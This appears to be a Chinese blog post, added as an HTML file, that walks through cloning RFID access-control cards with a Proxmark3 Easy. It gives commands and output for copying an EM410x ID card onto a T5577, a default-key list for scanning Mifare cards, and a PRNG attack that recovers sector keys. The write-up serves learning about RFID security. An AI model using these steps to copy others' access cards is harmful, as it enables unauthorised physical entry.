@@ -1,0 +1,1049 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/static/favicon.ico">
+  <link rel="icon" type="image/png" href="/img/static/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="Lzy-wi">
+  <meta name="keywords" content="">
+  <title>Proxmark3 Easy破解门禁卡学习过程 - Lzywi&#39;Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/10.0.0/styles/github-gist.min.css" />
+    
+  
+
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_pf9vaxs7x7b.css">
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+</head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Lzywi'Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner intro-2" id="background" parallax=true
+         style="background: url('/img/static/default.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="container page-header text-center fade-in-up">
+
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-07-26 18:28" pubdate>
+        2018年7月26日 晚上
+      </time>
+    </span>
+  
+</div>
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      字数统计:3.8k 字
+    </span>
+  
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      阅读时长:
+      51
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto" id="post">
+            <!-- SEO header -->
+            <h1 style="display: none">Proxmark3 Easy破解门禁卡学习过程</h1>
+            
+            <div class="markdown-body" id="post-body">
+              <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>&emsp;&emsp;安全不仅仅包含网络上的安全，在我们实际生活中也同样存在很多个安全相关的事物，可以说跟科技扯上关系的事物都会有安全问题，无线，蓝牙，手机，无人机，汽车。<strong>真正有问题的不是安全，而是人心。</strong>很多事物的设计之初都是没有考虑安全问题的，因为人心的不坏好意迫使去考虑它的安全问题。<br><a id="more"></a></p>
+<h4 id="硬件准备"><a href="#硬件准备" class="headerlink" title="硬件准备"></a>硬件准备</h4><h5 id="破解设备"><a href="#破解设备" class="headerlink" title="破解设备"></a>破解设备</h5><p>Proxmark3 Easy<br><img src="/img/2018-07-26/Proxmark3.jpg" srcset="/img/static/loading.gif" alt="Proxmark3 Easy"><br>破解工具不一定是Proxmark3 Easy，只要是还能够获取和修改卡片数据的设备都可以，比如arc122u，arc122u只能读取和修改高频卡，有点不足<br><img src="/img/2018-07-26/arc122u.jpg" srcset="/img/static/loading.gif" alt="arc122u"></p>
+<h5 id="各种卡"><a href="#各种卡" class="headerlink" title="各种卡"></a>各种卡</h5><p>准备一些ID，IC卡<br><img src="/img/2018-07-26/ka.jpg" srcset="/img/static/loading.gif" alt="ka"><br>这不都长一个样么（＃－.－）</p>
+<h5 id="区分ID卡和IC卡的方法"><a href="#区分ID卡和IC卡的方法" class="headerlink" title="区分ID卡和IC卡的方法"></a>区分ID卡和IC卡的方法</h5><ol>
+<li>光照法<br><img src="/img/2018-07-26/1.jpg" srcset="/img/static/loading.gif" alt="1"><br><img src="/img/2018-07-26/2.jpg" srcset="/img/static/loading.gif" alt="2"><br>圆形大多是ID卡，方形大多是IC卡</li>
+<li>NFC法<br>拿一部带有NFC功能的手机打开NFC，卡片靠近手机会响的是IC卡，不会响的是ID卡</li>
+</ol>
+<h4 id="知识准备"><a href="#知识准备" class="headerlink" title="知识准备"></a>知识准备</h4><p>&emsp;&emsp;首先，门禁卡所用到的技术是RFID，具体详情可以看这里–&gt;<a href="https://baike.baidu.com/item/%E5%B0%84%E9%A2%91%E8%AF%86%E5%88%AB%E6%8A%80%E6%9C%AF/9524139?fromtitle=RFID&amp;fromid=497249" target="_blank" rel="noopener">传送门</a>，首先从频率上可以分为高频（13.56MHZ）和低频两种类型的卡，在这两个频率上又会分为多种类型的卡。常见的卡的有</p>
+<style>
+table th:first-of-type {  
+    width: 25%; 
+}
+table th:nth-of-type(2) {  
+    width: 7%; 
+}
+table th:nth-of-type(3) {  
+    width: 68%; 
+}
+</style>
+
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th style="text-align:center">频率</th>
+<th>特性</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mifare S50(简称M1)</td>
+<td style="text-align:center">高频</td>
+<td>最常见的卡，每张卡有独一无二的UID号，可保存修改数据,常见学生卡，饭卡，公交卡，门禁卡</td>
+</tr>
+<tr>
+<td>Mifare UltraLight（简称M0）</td>
+<td style="text-align:center">高频</td>
+<td>低成本卡，出厂固化UID，可储存修改数据，常见地铁卡，公交卡</td>
+</tr>
+<tr>
+<td>Mifare UID（简称UID卡）</td>
+<td style="text-align:center">高频</td>
+<td>M1卡的变异版本，可修改UID，国外叫做中国魔术卡，可以用来克隆M1 S50的数据</td>
+</tr>
+<tr>
+<td>EM4XX（简称ID卡）</td>
+<td style="text-align:center">低频</td>
+<td>常用固化ID卡，出厂固化ID，只能读不能写（低成本门禁卡，小区门禁卡，停车场门禁卡）</td>
+</tr>
+<tr>
+<td>T5577（简称可修改ID卡）</td>
+<td style="text-align:center">低频</td>
+<td>可用来克隆ID卡，出厂为空卡，内有三区也可储存数据，个别三区科设置密码</td>
+</tr>
+<tr>
+<td>HID ProxⅡ（简称HID卡）</td>
+<td style="text-align:center">低频</td>
+<td>美国常用的低频卡，可擦写，不与其他卡通用</td>
+</tr>
+</tbody>
+</table>
+<h5 id="高频"><a href="#高频" class="headerlink" title="高频"></a>高频</h5><h6 id="M1-S50卡"><a href="#M1-S50卡" class="headerlink" title="M1 S50卡"></a>M1 S50卡</h6><p>&emsp;&emsp;目前最常见的高频卡，也是我们口中俗称的IC卡。M1卡科储存的数据大小为8k，分为16个扇区，每个扇区分4个块，每个块为16个字节，以块为存取单位。<strong>每个扇区都有独立的一组密码及访问控制</strong>，每张卡有唯一的一个32位的序列号。每个扇区的0,1,2块为数据块，用来存储数据，第3块为控制块，包括了密A、存取控制、密码B<br>每张卡的第0扇区的第0块用来春芳厂商代码，不可更改。<br><pre><code class="hljs undefined">扇区<span class="hljs-number">0</span>	<span class="hljs-number">03332801198804008500</span>b42ef0bb6aa8 块<span class="hljs-number">0</span>	 	<span class="hljs-comment">//厂商代码，不可更改</span>
+	<span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">1</span>	 	<span class="hljs-comment">//数据块</span>
+	<span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">2</span> 		<span class="hljs-comment">//数据块</span>
+	ffffffffffffff078069ffffffffffff 块<span class="hljs-number">3</span> 		<span class="hljs-comment">//密码A（6字节），存储控制（4字节），密码B（6字节）</span>
+
+扇区<span class="hljs-number">1</span>	<span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">4</span> 		<span class="hljs-comment">//出了第0扇区稍有不同，其他15个扇区结构完全一样</span>
+	<span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">5</span>
+	<span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">6</span>
+	ffffffffffffff078069ffffffffffff 块<span class="hljs-number">7</span>
+		        .
+		        .
+		        .   
+扇区<span class="hljs-number">15</span>	<span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">60</span>
+	<span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">61</span>
+	<span class="hljs-number">00000000000000000000000000000000</span> 块<span class="hljs-number">62</span>
+	ffffffffffffff078069ffffffffffff 块<span class="hljs-number">63</span></code></pre></p>
+<p>&emsp;&emsp;中间4字节控制字是管理密码权限，用来设置A密码和B密码的功能。默认不修改的时候，可以用A密码读写所有数据。A密码不可读出，B密码可以用A密码读出。<strong>密码不一定可以读取，由控制字决定。</strong></p>
+<h6 id="M1-UID卡"><a href="#M1-UID卡" class="headerlink" title="M1 UID卡"></a>M1 UID卡</h6><p>&emsp;&emsp;M1 UID卡是针对M1 S50卡特制的变种卡，用起来和M1 S50完全一样，只是多了一个功能，就是0扇区块的数据可以随意修改。因此UID号也可以随意修改，厂家信息也可以随意修改。UID卡修改0扇区0块数据是靠指令进入工厂模式，可以直接对全卡任何数据编辑，不需要密码即可读写卡，同时不怕写坏卡，即使写错0块，写坏扇区控制字，也可以随时修复回来，不影响后续使用。</p>
+<h6 id="FUID卡"><a href="#FUID卡" class="headerlink" title="FUID卡"></a>FUID卡</h6><p>&emsp;&emsp;FUID卡是针对UID卡做的优化。新的读卡系统，通过检测卡片对特殊指令的回应，可以检测出UID卡，因此可以来拒绝UID卡的访问，来达到屏蔽复制卡的功能。<strong>FUID可以修改0块，但只可以修改一次</strong>，写错也没办法更改，也不能重复利用。修改后和M1卡完全一样，很难被屏蔽检测。</p>
+<h6 id="CUID卡"><a href="#CUID卡" class="headerlink" title="CUID卡"></a>CUID卡</h6><p>&emsp;&emsp;CUID卡是针对FUID卡做的优化。CUID卡可以重复修改0块，但是它和UID卡的区别是，UID卡是通过<strong>指令</strong>修改0块，CUID使用的是常规密码验证的方法写0块，其他扇区和标准M1卡相同。缺点是，还是有可能会被检测出来，而且如果不小心写错了UID号的校验位导致无法读卡，没办法修复只能报废。</p>
+<h5 id="低频"><a href="#低频" class="headerlink" title="低频"></a>低频</h5><h6 id="ID卡"><a href="#ID卡" class="headerlink" title="ID卡"></a>ID卡</h6><p>&emsp;&emsp;ID卡是我们的俗称，内部芯片的全名叫做EM4100或EM41XX。每张卡出厂就有独一无二的ID号，不可改写。</p>
+<h6 id="T5577卡"><a href="#T5577卡" class="headerlink" title="T5577卡"></a>T5577卡</h6><p>&emsp;&emsp;T5577 卡是一种可以写入数据可以加密的低频卡。最特别之处是，写入ID号可以变身成为ID卡，写入HID号可以变身HID卡，写入Indala卡号，可以变身Indala卡。T5577一共有8个块，每个块只能存8位数。第0块是用来设置卡片类型和调制方式的，决定了卡片是ID卡还是HID卡，如果随意修改会导致读不到卡。最后一个块，在没有加密时是数据区，加密后，其数据就变成了密码。结构如下<br><pre><code class="hljs undefined"><span class="hljs-number">0x00148040</span>  <span class="hljs-number">00000000000101001000000001000000</span> [<span class="hljs-number">0</span>]
+<span class="hljs-number">0xFF94C004</span>  <span class="hljs-number">11111111100101001100000000000100</span> [<span class="hljs-number">1</span>]
+<span class="hljs-number">0xA5464942</span>  <span class="hljs-number">10100101010001100100100101000010</span> [<span class="hljs-number">2</span>]
+<span class="hljs-number">0xFFFFF808</span>  <span class="hljs-number">11111111111111111111100000001000</span> [<span class="hljs-number">3</span>]
+<span class="hljs-number">0x0001C000</span>  <span class="hljs-number">00000000000000011100000000000000</span> [<span class="hljs-number">4</span>]
+<span class="hljs-number">0x0001C000</span>  <span class="hljs-number">00000000000000011100000000000000</span> [<span class="hljs-number">5</span>]
+<span class="hljs-number">0x0001C000</span>  <span class="hljs-number">00000000000000011100000000000000</span> [<span class="hljs-number">6</span>]
+<span class="hljs-number">0x0001C000</span>  <span class="hljs-number">00000000000000011100000000000000</span> [<span class="hljs-number">7</span>]</code></pre></p>
+<h4 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h4><h5 id="破解ID卡"><a href="#破解ID卡" class="headerlink" title="破解ID卡"></a>破解ID卡</h5><h6 id="安装驱动"><a href="#安装驱动" class="headerlink" title="安装驱动"></a>安装驱动</h6><p>驱动下载官网网址–&gt;<a href="https://store.ryscc.com/blogs/news/how-to-install-a-proxmark3-driver-on-windows-10" target="_blank" rel="noopener">传送门</a><br>安装驱动文件前需要禁用<strong>驱动安装强制签名</strong>，方法–&gt;<a href="https://jingyan.baidu.com/article/624e74594dbc8d34e8ba5aa6.html" target="_blank" rel="noopener">传送门</a><br>驱动安装方法<br><strong>我的电脑右键–&gt;管理–&gt;设备管理器–&gt;端口下的设备右键–&gt;更新驱动程序–&gt;浏览我的计算机–&gt;选择本地–&gt;从磁盘安装–找到官方的驱动文件–&gt;确认</strong><br>驱动安装完成会显示图片上的样子，记住<strong>COM端口</strong><br><img src="/img/2018-07-26/4.png" srcset="/img/static/loading.gif" alt="4"></p>
+<h6 id="硬件使用方法"><a href="#硬件使用方法" class="headerlink" title="硬件使用方法"></a>硬件使用方法</h6><p><strong>Proxmark3 Easy</strong><br><img src="/img/2018-07-26/3.jpg" srcset="/img/static/loading.gif" alt="3"></p>
+<pre><code>1 功能按钮
+2 ABCD工作状态指示灯
+3 USB接口
+4 电源指示灯
+5 低频读卡区
+6 高频读卡区
+</code></pre><p>&emsp;&emsp;功能按钮有<code>退出</code>、<code>取消</code>、<code>停止</code>、<code>强刷固件</code>的功能，ABCD指示灯作为设备运行的依据，闪烁说明正在进行，完全熄灭或者常亮代表攻击失败、等待。全部熄灭表示已经停止运行了，直接重新拔插设备。</p>
+<h6 id="破解方法"><a href="#破解方法" class="headerlink" title="破解方法"></a>破解方法</h6><p><strong>读卡片ID号→换上T5577卡→把ID号写入卡片→完成</strong><br>ID是没有密码只有卡号的，因此只要知道卡号就可以复制。<br>软件资料包–&gt;<a href="https://pan.baidu.com/s/1feD3GKEaLw8jVTOGs5N40w" target="_blank" rel="noopener">密码: f8q4</a><br>打开<code>官方软件固件\pm3-bin-2.5.0\win32(client+GUI)\Proxmark Tool.exe</code>，箭头所指选择刚刚驱动安装的那个<code>COM端口</code>，连接Proxmark3，接入电脑后，电源指示灯处<code>POW</code>亮蓝灯，<code>FULL</code>亮绿灯，<code>CHR</code>闪烁微弱红灯。<br><img src="/img/2018-07-26/5.png" srcset="/img/static/loading.gif" alt="5"><br>在<code>COMMAND TO SEND</code>里输入<code>hw tune</code>测试天线谐振电压，高频超过5V，低频超过10V就可以正常使用。<br><pre><code class="hljs undefined"><span class="hljs-meta">proxmark3&gt;</span><span class="bash"> hw tune</span>
+Measuring antenna characteristics, please wait........          
+<span class="hljs-meta">#</span><span class="bash"> LF antenna: 22.27 V @   125.00 kHz          </span>
+<span class="hljs-meta">#</span><span class="bash"> LF antenna: 31.76 V @   134.00 kHz          </span>
+<span class="hljs-meta">#</span><span class="bash"> LF optimal: 31.76 V @   133.33 kHz          </span>
+<span class="hljs-meta">#</span><span class="bash"> HF antenna: 20.17 V @    13.56 MHz          </span>
+Displaying LF tuning graph. Divisor 89 is 134khz, 95 is 125khz.</code></pre></p>
+<p>把低频ID卡（门禁卡）放到低频读卡区输入<code>lf search</code>获取ID卡的信息，把卡号抄下来，复制时要用<br><pre><code class="hljs undefined">proxmark3&gt; lf search
+Reading <span class="hljs-number">30000</span> bytes from device memory
+Data fetched          
+Samples @ <span class="hljs-number">8</span> bits/smpl, decimation <span class="hljs-number">1</span>:<span class="hljs-number">1</span>           
+NOTE: <span class="hljs-keyword">some</span> demods output possible binary
+  <span class="hljs-keyword">if</span> it finds something that looks like a tag          
+<span class="hljs-literal">False</span> Positives ARE possible
+Checking <span class="hljs-keyword">for</span> known tags:
+EM410x pattern found:           
+EM TAG ID      : 0000001450         //<span class="hljs-type">ID</span>卡号，这个抄下来，如果是HID卡会显示HID
+Unique TAG ID  : 000000280<span class="hljs-type">A</span>          
+Possible de-scramble patterns          
+HoneyWell IdentKey &#123;          
+DEZ <span class="hljs-number">8</span>          : 00005200          
+DEZ <span class="hljs-number">10</span>         : 0000005200          
+DEZ <span class="hljs-number">5.5</span>        : 00000.05200          
+DEZ <span class="hljs-number">3.5</span>A       : 000.05200          
+DEZ <span class="hljs-number">3.5</span>B       : 000.05200          
+DEZ <span class="hljs-number">3.5</span>C       : 000.05200          
+DEZ <span class="hljs-number">14</span>/IK2     : 00000000005200          
+DEZ <span class="hljs-number">15</span>/IK3     : 000000000010250          
+DEZ <span class="hljs-number">20</span>/ZK      : 00000000000002080010          
+&#125;
+Other          : 05200_000_00005200          
+Pattern Paxton : 1331792 [0<span class="hljs-type">x145250</span>]          
+Pattern <span class="hljs-number">1</span>      : 16652 [0<span class="hljs-type">x410C</span>]          
+Pattern Sebury : 5200 0 5200  [0<span class="hljs-type">x1450</span> <span class="hljs-number">0</span>x0 <span class="hljs-number">0</span>x1450]          
+Valid EM410x ID Found! 			//卡的类型</code></pre></p>
+<p>把T5577卡放到低频读卡区，输入命令<code>lf hid clone 0000001450</code><br><pre><code class="hljs undefined"><span class="hljs-meta">proxmark3&gt;</span><span class="bash"> lf hid <span class="hljs-built_in">clone</span> 0000001450 </span>
+Cloning tag with ID 000001450          
+<span class="hljs-meta">proxmark3&gt;</span><span class="bash"> </span>
+<span class="hljs-meta">proxmark3&gt;</span><span class="bash"> <span class="hljs-comment">#db# DONE!</span></span></code></pre></p>
+<p>上述命令在左上方的命令树中都可以找到，左边有一些按钮和命令的介绍<br><img src="/img/2018-07-26/6.png" srcset="/img/static/loading.gif" alt="6"><br>ID卡复制就完成了<br>效果如下<br><img src="/img/2018-07-26/11.jpg" srcset="/img/static/loading.gif" alt="11"></p>
+<h5 id="破解IC卡"><a href="#破解IC卡" class="headerlink" title="破解IC卡"></a>破解IC卡</h5><h6 id="IC卡破解思路"><a href="#IC卡破解思路" class="headerlink" title="IC卡破解思路"></a>IC卡破解思路</h6><p><strong>获取任意扇区的密钥</strong></p>
+<ul>
+<li><strong>PRNG 漏洞攻击得 0 扇区密匙</strong></li>
+<li><strong>默认密码扫描获得密匙</strong></li>
+<li><strong>嗅探读卡机和卡片交互数据获得密匙</strong></li>
+<li><strong>模拟成 M1 卡刷卡后捕获密匙（挑读卡机，兼容性不好）</strong></li>
+</ul>
+<p>↓<br><strong>利用MFOC漏洞用已知扇区密钥求所有扇区密钥</strong><br>↓<br><strong>用破解出的密匙把卡片数据读出导入电脑</strong><br>↓<br><strong>把电脑中的数据写入UID卡中</strong><br>&emsp;&emsp;第一步是最重要也是最难的一步，很多IC卡往往都是难以攻破0扇区的密钥而无法进行下一步。默认密码扫描看运气，PRNG漏洞攻击概率低，后面两个虽然概率高但是成本高且实施比较困难。<br>&emsp;&emsp;上面的<code>Proxmark Tool</code>是官方英文版GUI，还有国内中文版GUI（Proxmark3_EASY_GUI），中文版的GUI比较简单，不用记很多命令，原生态<code>PM3指令台</code>就是纯命令行模式，看起来也比较有逼格点。一开始我是根据资料用英文版的GUI，感觉不怎么好用，后来用了原生态后觉得原生态的好用多了，但是要记命令，命令忘记了就用中文GUI查命令ㄟ( ▔, ▔ )ㄏ。<code>can&#39;t slect card</code>这个bug也是在用了原生态之后才知道的。<br><strong>PRNG漏洞获取0扇区密钥，486固件不掉线外，630之后的固件，有些卡可以破，有卡些会掉线并出现can’t slect card</strong><br><img src="/img/2018-07-26/7.png" srcset="/img/static/loading.gif" alt="7"></p>
+<h6 id="获取0扇区密钥"><a href="#获取0扇区密钥" class="headerlink" title="获取0扇区密钥"></a>获取0扇区密钥</h6><p>扯远了，默认密码扫描<code>hf mf chk *1 ? t</code><br><pre><code class="hljs undefined">proxmark3&gt; hf mf chk <span class="hljs-number">*1</span> ? t
+<span class="hljs-literal">No</span> key specified, trying<span class="hljs-built_in"> default </span>keys
+chk<span class="hljs-built_in"> default </span>key[ 0] ffffffffffff
+chk<span class="hljs-built_in"> default </span>key[ 1] 000000000000
+chk<span class="hljs-built_in"> default </span>key[ 2] a0a1a2a3a4a5
+chk<span class="hljs-built_in"> default </span>key[ 3] b0b1b2b3b4b5
+chk<span class="hljs-built_in"> default </span>key[ 4] aabbccddeeff
+chk<span class="hljs-built_in"> default </span>key[ 5] 4d3a99c351dd
+chk<span class="hljs-built_in"> default </span>key[ 6] 1a982c7e459a
+chk<span class="hljs-built_in"> default </span>key[ 7] d3f7d3f7d3f7
+chk<span class="hljs-built_in"> default </span>key[ 8] 714c5c886e97
+chk<span class="hljs-built_in"> default </span>key[ 9] 587ee5f9350f
+chk<span class="hljs-built_in"> default </span>key[10] a0478cc39091
+chk<span class="hljs-built_in"> default </span>key[11] 533cb6c723f6
+chk<span class="hljs-built_in"> default </span>key[12] 8fd0a4f256e9
+--sector: 0, block:  3, key type:A, key count:13
+		.
+		.
+		.
+--sector:15, block: 63, key type:B, key count:13
+Found valid key:[ffffffffffff]
+Found keys have been transferred <span class="hljs-keyword">to</span> the emulator memory</code></pre></p>
+<p>密码是默认密码的时候可以扫的出来，不是默认密码可以尝试PRNG漏洞获取0扇区密钥<code>hf mf mifare</code><br><pre><code class="hljs undefined">proxmark3&gt;hf mf mifare
+		.
+		.
+		.
+uid(ea117dee) nt(431c39b0) par(0000000000000000) ks(030702000a030209) nr(800000005)
+
+
+|<span class="hljs-string">diff</span>|<span class="hljs-string">&#123;nr&#125;    </span>|<span class="hljs-string">ks3</span>|<span class="hljs-string">ks3^5</span>|<span class="hljs-string">parity         </span>|
++----+--------+---+-----+---------------+
+|<span class="hljs-string"> 00 </span>|<span class="hljs-string">00000005</span>|<span class="hljs-string"> 3 </span>|<span class="hljs-string">  6  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>|
+|<span class="hljs-string"> 20 </span>|<span class="hljs-string">00000025</span>|<span class="hljs-string"> 7 </span>|<span class="hljs-string">  2  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>|
+|<span class="hljs-string"> 40 </span>|<span class="hljs-string">00000045</span>|<span class="hljs-string"> 2 </span>|<span class="hljs-string">  7  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>|
+|<span class="hljs-string"> 60 </span>|<span class="hljs-string">00000065</span>|<span class="hljs-string"> 0 </span>|<span class="hljs-string">  5  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>|
+|<span class="hljs-string"> 80 </span>|<span class="hljs-string">00000085</span>|<span class="hljs-string"> a </span>|<span class="hljs-string">  f  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>|
+|<span class="hljs-string"> a0 </span>|<span class="hljs-string">000000a5</span>|<span class="hljs-string"> 3 </span>|<span class="hljs-string">  6  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>|
+|<span class="hljs-string"> c0 </span>|<span class="hljs-string">000000c5</span>|<span class="hljs-string"> 2 </span>|<span class="hljs-string">  7  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>|
+|<span class="hljs-string"> e0 </span>|<span class="hljs-string">000000e5</span>|<span class="hljs-string"> 9 </span>|<span class="hljs-string">  c  </span>|<span class="hljs-string">0,0,0,0,0,0,0,0</span>|
+parity is all zero,try special attack!just wait for few more seconds...         
+p1:0 p2:0 p3:0 key:ffffffffffff
+p1:58b87 p2:61ec p3:1 key:b4c98bd73e94
+p1:c6a1b p2:d983 p3:2 key:576efc88ccc7
+p1:ef844 p2:106dd p3:3 key:34ed3c6092e9
+p1:f7e1e p2:10fd7 p3:4 key:2de06659d60e
+p1:1239c0 p2:13fa0 p3:5 key:08b7558601a1
+p1:12d1b3 p2:149c9 p3:6 key:00adbba1e330
+key_count:7
+------------------------------------------------------------------
+Key found:ffffffffffff
+
+Found valid key:ffffffffffff</code></pre></p>
+<p>因为设备是<del>我</del>小姐姐的，固件是630之后的，所以会出现很多<code>#db# Mifare: Can&#39;t select card</code>,就放不了全部代码，查看固件命令<code>hw version</code><br><pre><code class="hljs undefined"><span class="hljs-selector-tag">proxmark3</span>&gt; <span class="hljs-selector-tag">hw</span> <span class="hljs-selector-tag">version</span>
+<span class="hljs-selector-id">#db</span># <span class="hljs-selector-tag">Prox</span>/<span class="hljs-selector-tag">RFID</span> <span class="hljs-selector-tag">mark3</span> <span class="hljs-selector-tag">RFID</span> <span class="hljs-selector-tag">instrument</span>
+<span class="hljs-selector-id">#db</span># <span class="hljs-selector-tag">bootrom</span>: /<span class="hljs-selector-tag">-suspect</span> <span class="hljs-selector-tag">2016-11-09</span> <span class="hljs-selector-tag">00</span><span class="hljs-selector-pseudo">:59</span><span class="hljs-selector-pseudo">:56</span>
+<span class="hljs-selector-id">#db</span># <span class="hljs-selector-tag">os</span>: /<span class="hljs-selector-tag">-suspect</span> <span class="hljs-selector-tag">2016-12-08</span> <span class="hljs-selector-tag">12</span><span class="hljs-selector-pseudo">:45</span><span class="hljs-selector-pseudo">:38</span>
+<span class="hljs-selector-id">#db</span># <span class="hljs-selector-tag">HF</span> <span class="hljs-selector-tag">FPGA</span> <span class="hljs-selector-tag">image</span> <span class="hljs-selector-tag">built</span> <span class="hljs-selector-tag">on</span> <span class="hljs-selector-tag">2015</span>/<span class="hljs-selector-tag">03</span>/<span class="hljs-selector-tag">09</span> <span class="hljs-selector-tag">at</span> <span class="hljs-selector-tag">08</span><span class="hljs-selector-pseudo">:41</span><span class="hljs-selector-pseudo">:42</span>
+<span class="hljs-selector-id">#db</span>#   <span class="hljs-selector-tag">Modify</span> <span class="hljs-selector-tag">by</span> <span class="hljs-selector-tag">Willok</span>(willok<span class="hljs-variable">@163</span>.com)
+
+<span class="hljs-selector-id">#db</span>#      <span class="hljs-selector-tag">proxmark3</span><span class="hljs-selector-class">.taobao</span><span class="hljs-selector-class">.com</span>
+
+
+<span class="hljs-selector-tag">uC</span>: <span class="hljs-selector-tag">AT91SAM7S256</span> <span class="hljs-selector-tag">Rev</span> <span class="hljs-selector-tag">B</span>
+<span class="hljs-selector-tag">Embedded</span> <span class="hljs-selector-tag">Processor</span>: <span class="hljs-selector-tag">ARM7TDMI</span>
+<span class="hljs-selector-tag">Nonvolatile</span> <span class="hljs-selector-tag">Program</span> <span class="hljs-selector-tag">Memory</span> <span class="hljs-selector-tag">Size</span>: <span class="hljs-selector-tag">256K</span> <span class="hljs-selector-tag">bytes</span>
+<span class="hljs-selector-tag">Second</span> <span class="hljs-selector-tag">Nonvolatile</span> <span class="hljs-selector-tag">Program</span> <span class="hljs-selector-tag">Memory</span> <span class="hljs-selector-tag">Size</span>: <span class="hljs-selector-tag">None</span>
+<span class="hljs-selector-tag">Internal</span> <span class="hljs-selector-tag">SRAM</span> <span class="hljs-selector-tag">Size</span>: <span class="hljs-selector-tag">64K</span> <span class="hljs-selector-tag">bytes</span>
+<span class="hljs-selector-tag">Architecture</span> <span class="hljs-selector-tag">Identifier</span>: <span class="hljs-selector-tag">AT91SAM7Sxx</span> <span class="hljs-selector-tag">Series</span>
+<span class="hljs-selector-tag">Nonvolatile</span> <span class="hljs-selector-tag">Program</span> <span class="hljs-selector-tag">Memory</span> <span class="hljs-selector-tag">Type</span>: <span class="hljs-selector-tag">Embedded</span> <span class="hljs-selector-tag">Flash</span> <span class="hljs-selector-tag">Memory</span></code></pre></p>
